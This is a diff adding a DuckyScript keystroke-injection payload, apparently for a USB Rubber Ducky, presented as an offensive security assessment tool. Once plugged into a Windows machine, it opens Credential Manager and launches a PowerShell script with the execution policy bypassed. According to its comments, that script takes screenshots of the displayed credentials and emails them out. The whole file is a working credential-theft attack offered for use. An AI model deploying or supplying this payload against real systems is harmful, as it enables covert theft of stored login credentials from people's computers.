@@ -1,0 +1,19 @@
+REM Title: Capture & Send - Ducky & PowerShell (CSDP)
+REM Version: 1.0
+REM Description: Automates multiple screenshot captures and email upload via PowerShell using DuckyScript 3.0 for offensive security assessments.
+REM Author: datadotlog
+REM Target: Capture login credentials from the target system for security assessment purposes.
+REM Date: 16052024
+
+REM Open the Credential Manager in Windows
+DELAY 500
+GUI r
+STRING control /name Microsoft.CredentialManager
+ENTER
+DELAY 2000
+
+REM Execute PowerShell script to capture screenshots and send via email
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\<YourUsername>\CAE.ps1
+ENTER
